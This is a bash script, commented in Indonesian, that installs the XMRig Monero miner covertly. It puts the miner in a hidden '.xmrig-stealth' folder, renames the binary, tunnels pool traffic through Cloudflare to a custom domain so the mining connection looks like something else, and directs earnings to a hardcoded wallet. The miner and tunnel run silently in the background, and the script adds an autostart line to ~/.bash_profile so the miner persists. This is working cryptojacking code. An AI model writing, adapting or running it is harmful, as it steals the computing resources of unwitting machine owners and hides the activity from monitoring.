#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
DOMAIN="vheler.cfd"
POOL_TARGET="pool.hashvault.pro:443"
TUNNEL_NAME="xmrig-vheler"
WORKER="stealth-$(hostname 2>/dev/null || echo $RANDOM)"
DIR="$HOME/.xmrig-stealth"

# === SETUP FOLDER ===
mkdir -p "$DIR"
cd "$DIR"

# === DOWNLOAD CLOUDFLARED ===
if [ ! -f "cloudflared" ]; then
  echo "[*] Mengunduh cloudflared..."
  curl -LO https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
  mv cloudflared-linux-amd64 cloudflared
  chmod +x cloudflared
fi

# === LOGIN CLOUDFLARE ===
echo "[*] Login ke Cloudflare (buka browser)..."
./cloudflared tunnel login

# === BUAT TUNNEL ===
echo "[*] Membuat tunnel $TUNNEL_NAME..."
./cloudflared tunnel create $TUNNEL_NAME

# === AMBIL TUNNEL ID ===
TUNNEL_ID=$(ls ~/.cloudflared/*.json | sed 's/.*\///;s/\.json//')

# === KONFIG TUNNEL ===
mkdir -p ~/.cloudflared
cat > ~/.cloudflared/config.yml <<EOF
tunnel: $TUNNEL_ID
credentials-file: $HOME/.cloudflared/$TUNNEL_ID.json

ingress:
  - hostname: $DOMAIN
    service: tcp://$POOL_TARGET
  - service: http_status:404
EOF

# === DOWNLOAD XMRIG ===
echo "[*] Mengunduh XMRIG..."
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -Lso xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
mv xmrig xmrigd
chmod +x xmrigd

# === KONFIG MINING ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 90,
    "priority": 5
  },
  "pools": [{
    "url": "$DOMAIN:443",
    "user": "$WALLET.$WORKER",
    "pass": "Danis",
    "tls": true
  }]
}
EOF

# === JALANKAN CLOUDFLARE + MINER ===
nohup ./cloudflared tunnel run $TUNNEL_NAME >/dev/null 2>&1 &
sleep 3
nohup ./xmrigd --config=config.json >/dev/null 2>&1 &

# === AUTORUN SAAT LOGIN ===
cat > .autorun.sh <<EOF
#!/bin/bash
cd "$DIR"
nohup ./cloudflared tunnel run $TUNNEL_NAME >/dev/null 2>&1 &
sleep 3
nohup ./xmrigd --config=config.json >/dev/null 2>&1 &
EOF
chmod +x .autorun.sh

if ! grep -q ".xmrig-stealth/.autorun.sh" ~/.bash_profile 2>/dev/null; then
  echo "bash \$HOME/.xmrig-stealth/.autorun.sh" >> ~/.bash_profile
fi

echo
echo "[✓] XMRig via Cloudflare Tunnel domain $DOMAIN aktif dan autostart."
